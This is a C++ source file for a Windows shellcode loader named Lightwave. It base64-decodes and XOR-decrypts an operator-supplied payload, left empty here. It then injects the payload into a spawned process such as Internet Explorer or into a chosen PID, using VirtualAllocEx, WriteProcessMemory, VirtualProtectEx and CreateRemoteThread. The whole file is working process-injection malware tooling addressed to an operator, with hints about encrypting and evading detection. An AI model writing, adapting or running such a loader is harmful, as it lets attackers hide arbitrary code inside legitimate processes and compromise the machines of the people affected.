// Lightwave.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include "base64.h"
#include <string>


using std::cout;
using std::endl;
using std::string;

// DATA TYPES
enum ExecutionMode {
	EXEC = 1,
	PID = 2
};

// GLOBALS
bool DEBUG_MODE = false;
ExecutionMode E_MODE;
int TARGET_PID;
char* LAUNCH_COMMAND;

 
// DECRYPTION METHODS. DEPENDING ON WHICH ONE YOUR SC USES MAKE SURE TO CALL THE RIGHT ONE IN MAIN
// THEN, MAKE SURE TO UPDATE THE KEY INFORMATION
unsigned char* decryptXOR(unsigned char*, size_t);
unsigned char* decryptKey(unsigned char*, size_t);

// THE RUNNER METHOD, THIS IS PROVIDED
void run(unsigned char*, size_t);

int main(int argc, char** argv)
{
	// HANDLE ARGUMENT FOR PROCESS TO SPAWN
	if (argc < 3) {
		cout << "Invalid usage!" << endl;
		exit(1);
	}

	// DEAL WITH DEBUG MODE
	if (argc >= 4) {
		char d[] = "debug";
		if (strcmp(argv[3], d) == 0) {
			cout << "Debug mode!" << endl;
			DEBUG_MODE = true;
		}
	}

	if (DEBUG_MODE) {
		for (size_t i = 0; i < argc; i++) {
			cout << i << ": " << argv[i] << endl;
		}
	}

	// HANDLE MODE ARGUMENT
	char* modeStr = argv[1];
	char* argString = argv[2];
	if (strcmp(modeStr, "PID") == 0) {
		// EXECUTE BY CREATING A NEW PROCESS TO INJECT INTO
		E_MODE = PID;
		TARGET_PID = atoi(argString);

	}
	else if (strcmp(modeStr, "EXEC") == 0) {
		// EXECUTE BY INJECTING INTO AN EXISTING PROCESS WITH PID
		E_MODE = EXEC;
		cout << argv[2] << endl;
		LAUNCH_COMMAND = argString;
		cout << LAUNCH_COMMAND << endl;
	}
	else {
		if (DEBUG_MODE) cout << "Error with execution mode: must be EXEC or PID" << endl;
		exit(2);
	}


	// IMPORTANT! BASE64 ENCODED SC GOES HERE
	string encodedBytes = "";
	
	// BASE64 DECODE THE STRING TO GET BYTES
	string decodedBytes = base64_decode(encodedBytes);
	unsigned char* encryptedBytes = (unsigned char*) decodedBytes.c_str();
	size_t bufLen = decodedBytes.length();

	// DECRYPT THE BYTES
	unsigned char* decr = decryptKey(encryptedBytes, bufLen);

	// RUN THE SC
	run(decr, bufLen);

	return 0;

}


// EXAMPLE DECRYPTION METHOD WITH XOR KEY; THIS SHOULD BE FILLED IN WITH YOUR DECRYPTION METHOD
unsigned char* decryptXOR(unsigned char* encryptedBytes, size_t length) {
	if (DEBUG_MODE) cout << "Decrypting with bytewise XOR" << endl;
	const unsigned char xKey = 35;
	
	unsigned char* decrData = new unsigned char[length+1]; // ALLOCATE + 1 FOR NULL BYTE

	for (size_t i = 0; i < length; i++) {
		decrData[i] = encryptedBytes[i] ^ xKey;
	}
	decrData[length] = '\x00';
	if (DEBUG_MODE) cout << "finished decryption!" << endl;
	return decrData;
}

// EXAMPLE DECRYPTION METHOD WITH XOR KEY; THIS SHOULD BE FILLED IN WITH YOUR DECRYPTION METHOD
unsigned char* decryptKey(unsigned char* encryptedBytes, size_t length) {
	if (DEBUG_MODE) cout << "Decrypting with key..." << endl;
	// KEY AND KEY LENGTH
	char key[] = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'};
	size_t keyLength = 10;
	cout << "Got key " << key << " with length " << keyLength << endl;

	unsigned char* decrData = new unsigned char[length + 1]; // ALLOCATE + 1 FOR NULL BYTE

	// i IS THE INDEX IN THE SC
	// j IS THE INDEX IN THE KEY
	size_t j = 0;
	for (size_t i = 0; i < length; i++) {

		// IF WE'RE AT THE END OF THE KEY, GO BACK TO THE BEGINNING
		if (j == keyLength) {
			j = 0;
		}
		decrData[i] = encryptedBytes[i] ^ (unsigned char)key[j];
		j++;
	}
	decrData[length] = '\x00';
	if (DEBUG_MODE) cout << "finished decryption" << endl;
	return decrData;
}


void run(unsigned char* sc, size_t scLen) {

	// NOW THE FUN BEGINS
	HANDLE processHandle = NULL;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	BOOL success;

	// SWITCH DEPENDING ON THE EXECUTION MODE
	if (E_MODE == EXEC) {
		// EXECUTE AN APPLICATION LIKE IEXPLORE TO TARGET
		LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
		LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
		success = CreateProcessA(
			NULL,
			LAUNCH_COMMAND,
			NULL,
			NULL,
			NULL,
			NORMAL_PRIORITY_CLASS,
			NULL,
			NULL,
			pStartupInfo,
			pProcessInfo
		);
		if (!success) {
			if (DEBUG_MODE) cout << "Create Process for " << LAUNCH_COMMAND << " failed: " << success << endl;
			exit(3);
		}
		else {
			if (DEBUG_MODE) cout << "Create Process for " << LAUNCH_COMMAND << " succeeded!" << endl;
		}

		// GET THE PROCESS HANDLE
		processHandle = pProcessInfo->hProcess;
	}
	else if (E_MODE == PID) {

		// OPEN PROCESS WITH THE TARGET PID
		processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)TARGET_PID);
	}
	if (!processHandle) {
		if (DEBUG_MODE) cout << "Failed to get process Handle." << endl;

		exit(4);
	}
	else {
		if (DEBUG_MODE)  cout << "Got process handle!" << endl;
	}
	

	// ALLOCATE SPACE INSIDE THE REMOTE PROCESS
	remoteBuffer = VirtualAllocEx(processHandle, NULL, scLen, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	if (!remoteBuffer) {
		if (DEBUG_MODE) cout << "Failed to create remote buffer in target process" << endl;
		exit(5);
	}
	else {
		if (DEBUG_MODE) cout << "Allocating space (readwrite) succeeded!" << endl;
	}

	// WRITE PROCESS MEMORY
	success = WriteProcessMemory(processHandle, remoteBuffer, sc, scLen, NULL);
	if (!success) {
		if (DEBUG_MODE) cout << "Failed to write process memory" << endl;
		exit(6);
	}
	else {
		if (DEBUG_MODE) cout << "Write Process Memory succeeded!" << endl;
	}

	PDWORD oldProtectOption = new DWORD();
	*oldProtectOption = PAGE_READWRITE;

	// IMPORTANT! IF YOUR SHELLCODE IS POLYMORPHIC OR OTHERWISE SELF-MODIFYING THEN YOU NEED TO SWITCH "PAGE_EXECUTE" WITH "PAGE_READWRITE"
	success = VirtualProtectEx(processHandle, remoteBuffer, scLen, PAGE_EXECUTE, oldProtectOption);
	if (!success) {
		if (DEBUG_MODE) cout << "Failed to change memory protection to execute only" << endl;
	}
	else {
		if (DEBUG_MODE) cout << "Successfully changed memory protection to execute only" << endl;
	}


	// CREATE THREAD AND EXECUTE
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	if (!remoteThread) {
		if (DEBUG_MODE) cout << "Failed to create remote thread" << endl;
		exit(7);
	}
	else {
		if (DEBUG_MODE) cout << "Successfully created and executing thread in remote process" << endl;
	}

	CloseHandle(processHandle);

}
